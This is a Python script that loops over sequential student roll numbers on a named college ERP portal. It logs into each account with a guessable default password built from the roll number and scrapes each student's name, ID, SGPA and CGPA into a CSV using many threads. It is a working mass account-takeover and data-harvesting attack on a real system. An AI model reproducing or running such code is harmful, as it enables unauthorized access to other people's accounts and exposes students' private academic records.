import time

from fake_user_agent.main import user_agent
import  requests
from bs4 import BeautifulSoup
import pandas as pd
import threading
#user agen headers for entering the website
ua=user_agent('chrome')
sem=int(input('enter the semister'))
df=pd.DataFrame(columns=['ID','NAME','SGPA','CGPA'])
def getResult(start,end,le=False):
        global  sem
        if(le==True):
            if(sem>=3):
                sem=sem-2
            else:
                return

        for roll in range(start,end):
            # print('still inside')
            username=str(roll)+'P'
            password=str(roll)+'P'
            headers={'User-Agent':str(ua)}
            with requests.Session() as s:
                url="https://erp.cbit.org.in/Login.aspx"
                g=s.get(url,headers=headers)
                src=g.content
                soup=BeautifulSoup(src,'lxml')
                lis=soup.find_all('input',{'type':'hidden'})
                a=[]
                for i in lis:
                    a.append(i.attrs['value'])

                payload={'__VIEWSTATE':a[3],'__VIEWSTATEGENERATOR':a[4],'__EVENTVALIDATION':a[5],'txtUserName':username,'btnNext':'Next'}

                post2 = s.post('https://erp.cbit.org.in/Login.aspx', data=payload,allow_redirects=True)
                with open ('../user.html', 'w')as f:
                    f.write(post2.text)
                res=post2.content
                soup1=BeautifulSoup(res,'lxml')
                lis1=soup1.find_all('input',{'type':'hidden'})
                b=[]
                for i in lis1:
                    b.append(i.attrs['value'])

                payload1 = { '__VIEWSTATE': b[0],
                           '__VIEWSTATEGENERATOR': b[1], '__EVENTVALIDATION': b[2],'txtPassword': password, 'btnSubmit':'Submit'
                           }
                # print(post2.request.url)
                post1 = s.post(post2.request.url, data=payload1)
                # print(post1.request.url)
                # print('suceesfully bypassed password page')
                with open ('../password.html', 'w')as f:
                    f.write(post1.text)
                #https://erp.cbit.org.in/beeserp/StudentLogin/Student/OverallResultStudent.aspx
                #https://erp.cbit.org.in/beeserp/StudentLogin/Student/OverallMarksSemwise.aspx
                #FOR OVRERALL RESULT STUDENT
                # overall_result=s.get('https://erp.cbit.org.in/beeserp/StudentLogin/Student/OverallResultStudent.aspx')
                overall_result = s.get('https://erp.cbit.org.in/StudentLogin/Student/OverallResultStudent.aspx')
                with open ('../testting.html', 'w')as f:
                    f.write(overall_result.text)
                    # additional work
                rslt_page=overall_result.content
                parser=BeautifulSoup(rslt_page,'lxml')
                final_list=parser.find_all('tr',{'valign':'middle'})
                name=parser.find('span',{'id':'ctl00_cpHeader_ucStudCorner_lblStudentName'})
                # print(name)
                # temp=name.string.split('(')
                # print(temp)
                # id=temp[1].split(')')[0]
                # print(id)
                try:
                  arr=name.string.split('(')
                  name=arr[0].replace('WELCOME','').strip()
                  id=arr[1].split(')')[0].strip()
                except:
                    continue
                try:
                  container=final_list[sem].find_all('td')[2:4]
                except:
                    continue

                df.loc[len(df.index)] = [id,name,container[0].string,container[1].string]
                # print(df)
                print(name+' has been inserted into dataframe')

#creating threads for faster result
threads=[]
num=160120737000
numerical=180
breakpoint=10
for i in range(numerical):

    if(i<breakpoint):
        print('thread '+str(i)+' is created')
        threads.append( threading.Thread(target=getResult, args=(num,num+1)))
        num=num+1;
        threads[i].start()
    else:
        if(i%breakpoint==0) :
            time.sleep(30)
            print('thread ' + str(i) + ' is created')
            threads.append(threading.Thread(target=getResult, args=(num, num + 1)))
            num = num + 1;
            threads[i].start()
        else:

            print('thread ' + str(i) + ' is created')
            threads.append(threading.Thread(target=getResult, args=(num, num + 1)))
            num = num + 1;
            threads[i].start()


for j in range(numerical):

    threads[j].join()
    print('thread ' + str(j) + ' is exited')

df.to_csv('it2-5.csv')
